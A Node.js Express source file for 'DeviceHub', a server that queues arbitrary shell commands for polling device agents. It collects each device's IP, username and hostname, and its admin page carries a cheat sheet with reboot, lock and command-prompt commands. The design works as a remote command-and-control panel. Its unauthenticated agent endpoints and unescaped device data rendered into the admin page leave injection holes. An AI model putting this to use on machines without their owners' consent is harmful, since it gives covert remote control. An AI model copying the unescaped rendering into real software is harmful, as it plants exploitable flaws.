// DeviceHub cloud API + minimal Admin UI (no PowerShell)
// - Token-gated admin login (ADMIN_TOKEN env var)
// - Device list with neat "card" rows
// - Queue one-off commands per device
// - Delete device (single) + Delete Selected (bulk)
// - Device presence via /api/heartbeat and /api/pull

import express from "express";
import bodyParser from "body-parser";
import cors from "cors";

const PORT = process.env.PORT || 4000;
const ONLINE_WINDOW_MS = 30_000; // device is "online" if seen within 30s
const ADMIN_TOKEN = (process.env.ADMIN_TOKEN || "").trim();
// NEW: separate token for stats endpoint (used by lobster dashboard)
const STATS_TOKEN = (process.env.STATS_TOKEN || "").trim();

const app = express();
app.use(cors());
app.use(bodyParser.json());

// -------- In-memory state --------
const queues = new Map();   // deviceId -> [commands...]
const devices = new Map();  // deviceId -> { id, ip, hostname, username, os, lastSeen }

// NEW: track ever-seen and explicitly-deleted ids (for stats)
const everSeen = new Set();   // device ids we've ever seen in this process lifetime
const deletedSet = new Set(); // device ids explicitly deleted via admin

function enqueue(deviceId, command) {
  if (!queues.has(deviceId)) queues.set(deviceId, []);
  queues.get(deviceId).push(command);
}
function dequeue(deviceId) {
  const q = queues.get(deviceId);
  if (!q || !q.length) return null;
  return q.shift();
}
function clientIp(req) {
  return (
    (req.headers["x-forwarded-for"]?.toString().split(",")[0] || "").trim() ||
    req.socket?.remoteAddress ||
    ""
  );
}
function markSeen(id, req, partial = {}) {
  const now = Date.now();
  const ip = clientIp(req) || devices.get(id)?.ip || "";
  const prev = devices.get(id) || { id, ip: "", hostname: "", username: "", os: "", lastSeen: 0 };

  // NEW: remember this device was seen at least once
  everSeen.add(id);

  devices.set(id, {
    id,
    ip: ip || prev.ip,
    hostname: (partial.hostname ?? prev.hostname)?.toString() || "",
    username: (partial.username ?? prev.username)?.toString() || "",
    os: (partial.os ?? prev.os)?.toString() || "",
    lastSeen: now,
  });
}

// -------- Auth helper --------
function requireAdmin(req, res, next) {
  const h = (req.headers["x-admin-token"] || req.headers["authorization"] || "").toString().trim();
  const token = h.startsWith("Bearer ") ? h.slice(7) : h;
  if (ADMIN_TOKEN && token === ADMIN_TOKEN) return next();
  return res.status(401).json({ error: "auth_required" });
}

// -------- Health --------
app.get("/healthz", (_req, res) => res.status(200).send("ok"));

// -------- Device API (agent) --------

// Agent pulls next queued command (and we mark presence)
app.get("/api/pull", (req, res) => {
  const deviceId = (req.query.deviceId || "").toString().trim();
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  markSeen(deviceId, req);
  const cmd = dequeue(deviceId);
  res.json({ command: cmd ?? null });
});

// Agent posts metadata so UI can show details
// body: { deviceId, hostname, username, os }
app.post("/api/heartbeat", (req, res) => {
  const { deviceId, hostname, username, os } = req.body || {};
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  markSeen(deviceId.toString().trim(), req, { hostname, username, os });
  res.json({ ok: true });
});

// -------- Admin API (protected) --------

// Queue one-off command for a device
// body: { deviceId, command }
app.post("/api/command", requireAdmin, (req, res) => {
  const { deviceId, command } = req.body || {};
  if (!deviceId || !command) return res.status(400).json({ error: "deviceId and command are required" });
  enqueue(deviceId.toString(), command.toString());
  res.json({ ok: true });
});

// List devices with online flag
app.get("/api/devices", requireAdmin, (_req, res) => {
  const now = Date.now();
  const list = Array.from(devices.values()).map(d => ({ ...d, online: now - d.lastSeen <= ONLINE_WINDOW_MS }));
  list.sort((a, b) => b.lastSeen - a.lastSeen);
  res.json({ devices: list });
});

// Delete one device (clears queue too)
app.delete("/api/devices/:deviceId", requireAdmin, (req, res) => {
  const id = (req.params.deviceId || "").toString().trim();
  if (!id) return res.status(400).json({ error: "deviceId required" });

  // NEW: mark as deleted for stats
  deletedSet.add(id);

  devices.delete(id);
  queues.delete(id);
  res.json({ ok: true });
});

// (Optional) peek queue sizes
app.get("/api/queues", requireAdmin, (_req, res) => {
  const view = {};
  for (const [k, v] of queues.entries()) view[k] = v.length;
  res.json(view);
});

// -------- NEW: Stats endpoint (token-protected; used by lobster dashboard) --------
// GET /stats?token=...  (token must match STATS_TOKEN)
// Returns: { ts, installed, active, offline, deleted }
app.get("/stats", (req, res) => {
  const token = (req.query.token || "").toString();
  if (!STATS_TOKEN || token !== STATS_TOKEN) {
    return res.status(403).json({ error: "Forbidden" });
  }

  const now = Date.now();
  const list = Array.from(devices.values());
  const active = list.filter(d => now - d.lastSeen <= ONLINE_WINDOW_MS).length;
  const offlineFromCurrent = list.length - active;

  // installed: prefer everSeen (ever observed in this process), fallback to current size
  const installed = everSeen.size > 0 ? everSeen.size : list.length;

  const deleted = deletedSet.size;

  // We report "offline" as those currently tracked but not online.
  // (If a once-seen device isn't currently in memory, it won't be counted offline until it reappears.)
  const offline = offlineFromCurrent;

  res.json({ ts: Date.now(), installed, active, offline, deleted });
});

// -------- Admin UI (no PowerShell) --------
app.get("/admin", (_req, res) => {
  res.status(200).send(`<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>DeviceHub Admin</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root{color-scheme:dark light}
    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif;margin:24px;background:#0b0f14;color:#e6edf3}
    h1{margin:0 0 16px 0}
    .card{background:#0f1720;border:1px solid #1f2a37;border-radius:12px;padding:16px;margin-bottom:20px}
    .muted{color:#9fb2c8;font-size:13px}
    button{background:#2563eb;border:0;color:white;padding:8px 12px;border-radius:8px;cursor:pointer}
    button:hover{background:#1d4ed8}
    button.danger{background:#ef4444}
    input[type=text]{width:100%;background:#0b1220;border:1px solid #1f2a37;border-radius:8px;color:#e6edf3;padding:8px}
    .topbar{display:flex;justify-content:space-between;align-items:center}

    /* "card row" table look */
    table.tbl{width:100%;border-collapse:separate;border-spacing:0 10px}
    table.tbl thead th{padding:8px;color:#9fb2c8;text-align:left}
    table.tbl tbody td{background:#0f1720;border-top:1px solid #1f2a37;border-bottom:1px solid #1f2a37;padding:10px;vertical-align:top}
    table.tbl tbody td:first-child{border-left:1px solid #1f2a37;border-top-left-radius:12px;border-bottom-left-radius:12px}
    table.tbl tbody td:last-child{border-right:1px solid #1f2a37;border-top-right-radius:12px;border-bottom-right-radius:12px}

    .status-ok{color:#16a34a;font-weight:600}
    .status-bad{color:#ef4444;font-weight:600}
    .badge{display:inline-block;padding:3px 8px;border-radius:10px;background:#0b1220;border:1px solid #1f2a37}
    .login{display:flex;gap:8px;align-items:center;max-width:520px}
    .chip{display:inline-block;background:#0b1220;border:1px solid #1f2a37;border-radius:999px;padding:6px 10px;margin:4px 6px;cursor:pointer}
    .chip:hover{border-color:#2a3a4a}
  </style>
</head>
<body>
  <h1>DeviceHub Admin</h1>

  <div class="card" id="loginCard">
    <div class="login">
      <input id="token" type="password" placeholder="Admin token" />
      <button onclick="login()">Login</button>
      <span class="muted" id="loginMsg"></span>
    </div>
  </div>

  <div id="app" style="display:none">
    <div class="card topbar">
      <div class="muted">Authenticated</div>
      <div style="display:flex; gap:8px; align-items:center">
        <button class="danger" onclick="deleteSelected()">Delete Selected</button>
        <button onclick="render()">Refresh</button>
        <button onclick="logout()">Logout</button>
      </div>
    </div>

    <div class="card">
      <details class="card">
        <summary><strong>📋 Command Cheat Sheet</strong></summary>
        <div style="margin-top:12px;">
          <div><span class="chip" data-cmd="notepad.exe">notepad.exe</span>
               <span class="chip" data-cmd="calc.exe">calc.exe</span>
               <span class="chip" data-cmd="mspaint.exe">mspaint.exe</span></div>
          <div><span class="chip" data-cmd="start msedge.exe --kiosk https://www.bing.com --edge-kiosk-type=fullscreen">Edge kiosk (Bing)</span>
               <span class="chip" data-cmd="taskkill /IM msedge.exe /F">Close Edge kiosk</span></div>
          <div><span class="chip" data-cmd="rundll32.exe user32.dll,LockWorkStation">Lock workstation</span>
               <span class="chip" data-cmd="shutdown /r /t 0">Reboot now</span></div>
          <p class="muted" style="margin-top:8px">
            Tip: to open a System32 Command Prompt visibly on the user session, try:<br/>
            <code>if exist "%25windir%25\\Sysnative\\cmd.exe" (start "" "%25windir%25\\Sysnative\\cmd.exe") else (start "" "%25windir%25\\System32\\cmd.exe")</code>
          </p>
        </div>
      </details>

      <div id="tableWrap"></div>
    </div>
  </div>

<script>
let lastFocusedDeviceId = null;
let chipBound = false;

function getToken(){ return sessionStorage.getItem('admin_token') || ''; }
function setToken(t){ sessionStorage.setItem('admin_token', t); }
function clearToken(){ sessionStorage.removeItem('admin_token'); }

async function login(){
  const t = document.getElementById('token').value.trim();
  if(!t){ document.getElementById('loginMsg').innerText = 'Enter token'; return; }
  const ok = await fetch('/api/queues', { headers: { 'x-admin-token': t }}).then(r => r.status !== 401).catch(()=>false);
  if(ok){
    setToken(t);
    document.getElementById('loginCard').style.display = 'none';
    document.getElementById('app').style.display = 'block';
    render();
  } else {
    document.getElementById('loginMsg').innerText = 'Invalid token';
  }
}
function logout(){ clearToken(); location.reload(); }

function fmtTime(ts){ return ts ? new Date(ts).toLocaleString() : ''; }

function selectedIds(){ return Array.from(document.querySelectorAll('.selbox:checked')).map(cb => cb.value); }
function toggleAll(checkbox){ document.querySelectorAll('.selbox').forEach(cb => { cb.checked = checkbox.checked; }); }

async function deleteSelected(){
  const ids = selectedIds();
  if(ids.length === 0) { alert('No devices selected'); return; }
  if(!confirm('Delete ' + ids.length + ' device(s)?')) return;
  for(const id of ids){
    await fetch('/api/devices/' + encodeURIComponent(id), {
      method:'DELETE',
      headers: { 'x-admin-token': getToken() }
    }).catch(()=>{});
  }
  render();
}

async function fetchDevices(){
  const r = await fetch('/api/devices', { headers: { 'x-admin-token': getToken() }});
  if(r.status===401){ logout(); return []; }
  return (await r.json()).devices || [];
}

async function render(){
  const devices = await fetchDevices();
  const rows = devices.map(d => {
    const status = d.online ? '<span class="status-ok">ONLINE</span>' : '<span class="status-bad">OFFLINE</span>';
    const inputId = 'cmd-' + (d.id||'');
    return \`
      <tr>
        <td style="width:36px"><input type="checkbox" class="selbox" value="\${d.id}"></td>
        <td><span class="badge">\${d.id||''}</span><br/><span class="muted">last seen: \${fmtTime(d.lastSeen)}</span></td>
        <td>\${d.ip||''}</td>
        <td>\${d.username||''}</td>
        <td>\${d.hostname||''}</td>
        <td>\${d.os||''}</td>
        <td>
          <input type="text" placeholder="Command (e.g. start msedge.exe ...)" id="\${inputId}" onfocus="lastFocusedDeviceId='\${d.id}'">
          <button style="margin-left:6px" onclick="execCmd('\${d.id}', '\${inputId}')">Execute</button>
          <button class="danger" style="margin-left:8px" onclick="delDev('\${d.id}')">Delete</button>
        </td>
        <td>\${status}</td>
      </tr>\`;
  }).join('');
  document.getElementById('tableWrap').innerHTML = \`
    <table class="tbl">
      <thead>
        <tr>
          <th><input type="checkbox" onclick="toggleAll(this)"></th>
          <th>Device ID</th>
          <th>IP</th>
          <th>Username</th>
          <th>Hostname</th>
          <th>OS</th>
          <th>Actions</th>
          <th>Status</th>
        </tr>
      </thead>
      <tbody>\${rows}</tbody>
    </table>\`;

  if(!chipBound){
    document.addEventListener('click', (e)=>{
      const chip = e.target.closest('.chip');
      if(!chip) return;
      if(!lastFocusedDeviceId){ alert('Click into a device Command box first.'); return; }
      const input = document.getElementById('cmd-' + lastFocusedDeviceId);
      if(input){ input.value = chip.getAttribute('data-cmd') || ''; input.focus(); }
    });
    chipBound = true;
  }
}

async function execCmd(deviceId, inputId){
  const inp = document.getElementById(inputId);
  const command = (inp.value||'').trim();
  if(!command){ alert('Enter a command'); return; }
  const r = await fetch('/api/command',{
    method:'POST',
    headers:{'Content-Type':'application/json','x-admin-token': getToken()},
    body: JSON.stringify({deviceId, command})
  });
  const j = await r.json();
  if(j.ok){ inp.value=''; alert('Queued'); } else { alert('Error: '+(j.error||'unknown')); }
}

async function delDev(id){
  if(!confirm('Delete device ' + id + ' ?')) return;
  const r = await fetch('/api/devices/' + encodeURIComponent(id), {
    method:'DELETE',
    headers:{'x-admin-token': getToken()}
  });
  const j = await r.json();
  if(j.ok){ render(); } else { alert('Delete failed: ' + (j.error||'')); }
}
</script>
</body>
</html>`);
});

// -------- Start --------
app.listen(PORT, "0.0.0.0", () => {
  console.log(`HTTP polling server running on :${PORT}`);
});
